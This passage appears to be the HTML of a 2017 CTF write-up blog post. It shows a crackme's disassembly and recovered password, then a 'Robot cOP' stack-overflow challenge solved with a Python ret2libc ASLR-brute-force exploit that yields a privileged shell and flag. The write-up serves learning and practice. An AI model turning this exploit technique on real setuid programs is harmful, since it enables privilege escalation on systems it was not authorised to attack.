+   <span class="mh">0x0000000000400957</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">rbp</span>
+   <span class="mh">0x0000000000400958</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">rsp</span>
+   <span class="mh">0x000000000040095b</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x20</span>
+   <span class="mh">0x000000000040095f</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x18</span><span class="err">]</span><span class="p">,</span><span class="n">rdi</span>
+   <span class="mh">0x0000000000400963</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x18</span><span class="err">]</span>
+   <span class="mh">0x0000000000400967</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
+   <span class="mh">0x000000000040096a</span> <span class="o">&lt;+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x40087f</span> <span class="o">&lt;</span><span class="n">passwordBeautifyier</span><span class="o">&gt;</span>
+   <span class="mh">0x000000000040096f</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="err">]</span><span class="p">,</span><span class="n">rax</span>
+   <span class="mh">0x0000000000400973</span> <span class="o">&lt;+</span><span class="mi">28</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="err">]</span>
+   <span class="mh">0x0000000000400977</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="mh">0xa</span>
+   <span class="mh">0x000000000040097c</span> <span class="o">&lt;+</span><span class="mi">37</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">esi</span><span class="p">,</span><span class="mh">0x400b58</span>
+   <span class="mh">0x0000000000400981</span> <span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
+   <span class="mh">0x0000000000400984</span> <span class="o">&lt;+</span><span class="mi">45</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x400620</span> <span class="o">&lt;</span><span class="n">strncmp</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+   <span class="mh">0x0000000000400989</span> <span class="o">&lt;+</span><span class="mi">50</span><span class="o">&gt;:</span>	<span class="k">test</span>   <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
+   <span class="mh">0x000000000040098b</span> <span class="o">&lt;+</span><span class="mi">52</span><span class="o">&gt;:</span>	<span class="k">jne</span>    <span class="mh">0x4009a0</span> <span class="o">&lt;</span><span class="n">letsCheckThisPass</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;</span>
+   <span class="mh">0x000000000040098d</span> <span class="o">&lt;+</span><span class="mi">54</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="err">]</span>
+   <span class="mh">0x0000000000400991</span> <span class="o">&lt;+</span><span class="mi">58</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
+   <span class="mh">0x0000000000400994</span> <span class="o">&lt;+</span><span class="mi">61</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x400610</span> <span class="o">&lt;</span><span class="n">free</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+   <span class="mh">0x0000000000400999</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x1</span>
+   <span class="mh">0x000000000040099e</span> <span class="o">&lt;+</span><span class="mi">71</span><span class="o">&gt;:</span>	<span class="k">jmp</span>    <span class="mh">0x4009b1</span> <span class="o">&lt;</span><span class="n">letsCheckThisPass</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;</span>
+   <span class="mh">0x00000000004009a0</span> <span class="o">&lt;+</span><span class="mi">73</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="err">]</span>
+   <span class="mh">0x00000000004009a4</span> <span class="o">&lt;+</span><span class="mi">77</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
+   <span class="mh">0x00000000004009a7</span> <span class="o">&lt;+</span><span class="mi">80</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x400610</span> <span class="o">&lt;</span><span class="n">free</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+   <span class="mh">0x00000000004009ac</span> <span class="o">&lt;+</span><span class="mi">85</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+   <span class="mh">0x00000000004009b1</span> <span class="o">&lt;+</span><span class="mi">90</span><span class="o">&gt;:</span>	<span class="k">leave</span>  
+   <span class="mh">0x00000000004009b2</span> <span class="o">&lt;+</span><span class="mi">91</span><span class="o">&gt;:</span>	<span class="k">ret</span>    
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+</code></pre></div></div>
+
+<p>The function is very simple. First it call the function “passwordBeautifyier” at line +19 with the tested password as parameter and then it compare the return value of “passwordBeautifyier” with the goal password. The compared password is “cyber@hack” but the problem is the “passwordBeautifyier” function because it mix the current password so we can’t just enter “cyber@hack” as program parameter.</p>
+
+<p>To solve the problem, I choose the lazy solution, instead of disassemble the “passwordBeautifyier” function I test different value and checked my result. After different test, I get the value “-ccyyybberr@@hhaacckk+” which seems to match with the goal password. Let’s try it:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./crackme <span class="nt">-ccyyybberr</span>@@hhaacckk+
+Good one <span class="o">!</span> You can validate the chall with : flag<span class="o">{</span>W3lC0M3_t0_CYb3R@H4Ck<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Done.</p>
+<h1 id="5-robot-cop">5. Robot cOP</h1>
+<p>This one was an exploit challenge. Let’s check the binary:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file Robot_cOP 
+Robot_cOP: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>5da4c256b34d973d0ff80aff762a9d443c9aadb9, not stripped
+
+<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lh</span> Robot_cOP 
+<span class="nt">-rwxr-xr-x</span> 1 meffre_q meffre_q 5.4K Sep 21 22:40 Robot_cOP
+
+<span class="nv">$ </span>checksec <span class="nt">--file</span> Robot_cOP 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		2	Robot_cOP
+
+
+<span class="nv">$ </span>./Robot_cOP 
+Only Inspector Gadget, can use Robot cOP
+
+<span class="nv">$ </span>./Robot_cOP toto
+
+
+<span class="nv">$ </span>nm Robot_cOP
+...
+         U system@@GLIBC_2.0
+...
+</code></pre></div></div>
+
+<p>So the binary seems to be basic. It is a 32 bits elf dinamycally compiled and we can see thanks to “nm” the system LibC function so maybee the program use it somewhere. Let’s disassemble it!</p>
+
+<p>After checking the “main” function, the most important things is the call to “my_bad” function. You can see below the disassembled code:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gdb</span><span class="o">-</span><span class="n">peda</span><span class="err">$</span> <span class="n">disas</span> <span class="n">my_bad</span> 
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="n">for</span> <span class="n">function</span> <span class="n">my_bad</span><span class="o">:</span>
+   <span class="mh">0x08048483</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">ebp</span>
+   <span class="mh">0x08048484</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+   <span class="mh">0x08048486</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="k">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x808</span>
+   <span class="mh">0x0804848c</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span>	<span class="k">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span>
+   <span class="mh">0x0804848f</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span>
+   <span class="mh">0x08048492</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;:</span>	<span class="k">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x808</span><span class="err">]</span>
+   <span class="mh">0x08048498</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">eax</span>
+   <span class="mh">0x08048499</span> <span class="o">&lt;+</span><span class="mi">22</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x8048310</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+   <span class="mh">0x0804849e</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;:</span>	<span class="k">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
+   <span class="mh">0x080484a1</span> <span class="o">&lt;+</span><span class="mi">30</span><span class="o">&gt;:</span>	<span class="k">leave</span>  
+   <span class="mh">0x080484a2</span> <span class="o">&lt;+</span><span class="mi">31</span><span class="o">&gt;:</span>	<span class="k">ret</span>    
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+</code></pre></div></div>
+
+<p>The function is very easy. First it allocate 0x808 (2056) bytes on the stack, then push the first argument which is the first program argument, then load the address of the allocated buffer, push that buffer and then copy the first program argument into the buffer. So if we give to strcpy a buffer greater than 0x808 bytes we will overflow the return adress.</p>
+
+<p>Instead of using the ROP technic to solve the challenge, I choose a very fast one which I described in a <a href="/pwn/2017/05/14/aslr_bruteforce.html">previous post</a>, the ASLR bruteforce! As I already explained it in details in my previous post, I will only show you the final exploit:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
+<span class="c"># coding: utf-8</span>
+
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">base</span> <span class="o">=</span> <span class="mh">0xf754e000</span>                  <span class="c"># base libc address's</span>
+<span class="n">system_offset</span> <span class="o">=</span> <span class="mh">0x0003e3e0</span>         <span class="c"># system offset function</span>
+<span class="n">exit_offset</span> <span class="o">=</span> <span class="mh">0x000311b0</span>           <span class="c"># exit offset function</span>
+<span class="n">binsh</span> <span class="o">=</span>  <span class="mh">0x804825c</span>                 <span class="c"># /bin/sh  addresse's contained in the binary</span>
+
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">system_offset</span> <span class="c"># final system address's</span>
+<span class="n">exit_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">exit_offset</span>     <span class="c"># final exit address's</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">2060</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">system_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">exit_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span><span class="n">binsh</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s">"/challenges/robot_cop/Robot_cOP"</span><span class="p">,</span> <span class="n">payload</span><span class="p">])</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">result</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">"Done"</span>
+        <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">"KO</span><span class="se">\n</span><span class="s">"</span>
+</code></pre></div></div>
+
+<p>And we test:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python /tmp/brute.py
+KO
+
+KO
+
+KO
+...
+
+<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1334<span class="o">(</span>dagger<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1310<span class="o">(</span>robot_cop-solved<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>1305<span class="o">(</span>robot_cop<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1305<span class="o">(</span>robot_cop<span class="o">)</span>,1002<span class="o">(</span>tocttou<span class="o">)</span>,1306<span class="o">(</span>2befree<span class="o">)</span>,1307<span class="o">(</span>basic_rop<span class="o">)</span>,1311<span class="o">(</span>botoxedstring<span class="o">)</span>,1312<span class="o">(</span>fakemalware-killswitch<span class="o">)</span>,1334<span class="o">(</span>dagger<span class="o">)</span>
+<span class="nv">$ </span><span class="nb">cat </span>flag
+flag<span class="o">{</span>0r5t7hvR4dfTyhj67yKLO<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Done.</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#write-up-ref">
+					write-up <span>(1)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#pwn-ref">
+					pwn <span>(3)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#reverse-engineering-ref">
+					reverse-engineering <span>(1)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=[Write-Up] Cyber@Hack&via=https://twitter.com/0xdagger"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="//www.gravatar.com/avatar/" class="img-rounded author-image" />
+        <h4 class="section-title author-name">Quentin Meffre</h4>
+        <p class="author-bio">Computer science student, passionate about Cyber Security.</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/shellcode/2017/05/28/basic_shellcode.html" title="Basic Shellcode">&larr; Previous</a></li>
+		  
+		  
+			<li class="next disabled"><a>Next &rarr;</a>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2017 Quentin Meffre with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-90952644-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
